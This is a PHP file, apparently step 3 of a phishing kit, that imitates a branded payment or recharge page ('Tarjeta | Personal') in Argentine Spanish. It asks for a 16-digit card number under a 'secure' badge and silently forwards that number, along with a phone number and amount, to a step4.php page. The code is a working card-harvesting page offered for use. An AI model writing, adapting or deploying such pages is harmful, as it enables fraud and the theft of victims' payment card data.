<?php
/**
 * STEP 3 - Captura número de tarjeta
 */

$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
$amount = isset($_POST['amount']) ? trim($_POST['amount']) : '';

if(isset($_POST['card']) && !empty($_POST['card'])) {
    ?>
    <!DOCTYPE html>
    <html>
    <head><title>Redirigiendo...</title></head>
    <body>
        <form id="autoForm" method="POST" action="step4.php">
            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
            <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
            <input type="hidden" name="card" value="<?php echo htmlspecialchars($_POST['card']); ?>">
        </form>
        <script>document.getElementById('autoForm').submit();</script>
    </body>
    </html>
    <?php
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tarjeta | Personal</title>
    <link rel="stylesheet" href="css/op/bootstrap.min.css">
    <link rel="stylesheet" href="css/op/styles.css">
</head>
<body style="background-color: #e5e5e5;">
    <div class="container-fluid">
        <div class="row">
            <div class="col-12 p-0">
                <header class="header">
                    <nav class="px-0 pt-0">
                        <div class="d-flex justify-content-between align-items-center" style="padding: 20px;">
                            <div><img src="assets/flow.svg" style="height: 40px;"></div>
                            <div><img src="assets/secure.svg" style="height: 30px;"></div>
                        </div>
                    </nav>
                </header>

                <div class="row justify-content-center mt-5">
                    <div class="col-12 text-center">
                        <h1 style="color: #333; font-size: 28px; margin-bottom: 30px;">Número de tarjeta</h1>
                    </div>

                    <div class="col-11 col-sm-6">
                        <form method="POST" action="step3.php">
                            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
                            <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
                            
                            <div class="form-group">
                                <label style="color: #666;">Número de tarjeta</label>
                                <input type="text" name="card" id="card" class="form-control" placeholder="1234 5678 9012 3456" maxlength="19" style="height: 50px; font-size: 16px;" required>
                                <small class="text-muted">Ingresá los 16 dígitos</small>
                            </div>

                            <div class="text-center mt-4">
                                <button type="button" onclick="window.history.back()" class="btn btn-secondary px-4 py-2 mr-2">Volver</button>
                                <button type="submit" id="btnContinuar" class="btn btn-primary px-4 py-2" disabled style="background: #00a8e1; border: none;">Continuar</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="javascript/query.min.js"></script>
    <script src="javascript/jquery.mask.js"></script>
    <script>
        $('#card').mask('0000 0000 0000 0000');
        $('#card').on('keyup', function(){
            var valor = $(this).val().replace(/ /g, '');
            $('#btnContinuar').prop('disabled', valor.length < 15);
        });
    </script>
</body>
</html>